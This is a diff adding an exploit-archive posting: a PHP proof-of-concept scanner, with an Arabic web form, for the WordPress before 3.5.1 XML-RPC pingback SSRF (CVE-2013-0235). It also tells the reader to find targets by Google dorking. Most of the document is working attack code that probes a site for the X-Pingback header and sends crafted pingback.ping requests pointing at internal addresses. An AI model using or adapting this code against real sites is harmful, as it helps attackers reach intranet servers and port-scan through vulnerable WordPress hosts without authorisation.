@@ -1,0 +1,134 @@
+=============================================================================================================================================
+| # Title     : WordPress before 3.5.1 Pingback Checker Tool                                                                                |
+| # Author    : indoushka                                                                                                                   |
+| # Tested on : windows 10 Fr(Pro) / browser : Mozilla firefox 135.0.1 (64 bits)                                                            |
+| # Vendor    : https://wordpress.org/                                                                                                      |
+=============================================================================================================================================
+
+POC :
+
+[+] Dorking İn Google Or Other Search Enggine.
+
+[+] Code Description: The XMLRPC API in WordPress before 3.5.1 allows remote attackers to send HTTP requests to intranet servers, and conduct port-scanning attacks, by specifying a crafted source URL for a pingback, related to a Server-Side Request Forgery (SSRF) issue.
+   
+   (linked: https://packetstorm.news/files/id/181085/ Linked CVE numbers: 	CVE-2013-0235),
+	
+[+] save code as poc.php.
+
+[+] USage : http://127.0.0.1/poc.php 
+
+[+] PayLoad :
+
+<?php
+
+class WordpressPingbackLocator {
+    private $targetUri;
+    private $numRedirects;
+    private $dbActive;
+
+    public function __construct($targetUri = '/', $numRedirects = 10) {
+        $this->targetUri = rtrim($targetUri, '/') . '/';
+        $this->numRedirects = $numRedirects;
+        $this->dbActive = $this->checkDatabase();
+    }
+
+    private function checkDatabase() {
+        // تحقق مما إذا كان هناك اتصال بقاعدة البيانات
+        return function_exists('mysqli_connect');
+    }
+
+    public function getXmlRpcUrl($ip) {
+        echo "$ip - Enumerating XML-RPC URI...\n";
+        
+        $headers = get_headers("http://$ip{$this->targetUri}", 1);
+        if (isset($headers['X-Pingback'])) {
+            return $headers['X-Pingback'];
+        }
+        echo "$ip - X-Pingback header not found\n";
+        return null;
+    }
+
+    public function generatePingbackXml($target, $validBlogPost) {
+        return "<?xml version=\"1.0\" encoding=\"iso-8859-1\"?>" .
+               "<methodCall><methodName>pingback.ping</methodName>" .
+               "<params><param><value><string>$target</string></value></param>" .
+               "<param><value><string>$validBlogPost</string></value></param>" .
+               "</params></methodCall>";
+    }
+
+    public function getBlogPosts($xmlRpc, $ip) {
+        $blogPosts = $this->getAllBlogPosts();
+        foreach ($blogPosts as $blogPost) {
+            $response = $this->sendPingbackRequest($xmlRpc, 'http://127.0.0.1', $blogPost);
+            if ($response && strpos($response, '<value><int>33</int></value>') === false) {
+                echo "$ip - Pingback enabled: $blogPost\n";
+                return $blogPost;
+            }
+        }
+        return null;
+    }
+
+    private function sendPingbackRequest($xmlRpc, $target, $blogPost) {
+        $pingbackXml = $this->generatePingbackXml($target, $blogPost);
+        $ch = curl_init($xmlRpc);
+        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+        curl_setopt($ch, CURLOPT_POST, true);
+        curl_setopt($ch, CURLOPT_POSTFIELDS, $pingbackXml);
+        $response = curl_exec($ch);
+        curl_close($ch);
+        return $response;
+    }
+
+    private function getAllBlogPosts() {
+        return ["http://example.com/post1", "http://example.com/post2"];
+    }
+
+    public function runHost($ip) {
+        echo "$ip - Checking if it's a WordPress site...\n";
+        $xmlrpc = $this->getXmlRpcUrl($ip);
+        if (!$xmlrpc) {
+            echo "$ip - Not vulnerable or not a WordPress site\n";
+            return;
+        }
+
+        $blogPost = $this->getBlogPosts($xmlrpc, $ip);
+        if ($blogPost && $this->dbActive) {
+            $this->storeVuln($ip, $blogPost);
+        } else {
+            echo "$ip - X-Pingback enabled but no vulnerable blogs found\n";
+        }
+    }
+
+    private function storeVuln($ip, $blog) {
+        echo "Stored vulnerability: $ip - Pingback found at $blog\n";
+    }
+}
+
+if ($_SERVER['REQUEST_METHOD'] === 'POST') {
+    $target = $_POST['target'] ?? '';
+    if (!empty($target)) {
+        $scanner = new WordpressPingbackLocator('/wordpress/');
+        $scanner->runHost($target);
+    }
+}
+?>
+
+<!DOCTYPE html>
+<html lang="ar">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>فحص WordPress Pingback</title>
+</head>
+<body>
+    <h2>أداة فحص WordPress Pingback</h2>
+    <form method="POST">
+        <label for="target">أدخل عنوان الموقع:</label>
+        <input type="text" id="target" name="target" required>
+        <button type="submit">فحص</button>
+    </form>
+</body>
+</html>
+Greetings to :=====================================================================================
+jericho * Larry W. Cashdollar * LiquidWorm * Hussin-X * D4NB4R * Malvuln (John Page aka hyp3rlinx)|
+===================================================================================================
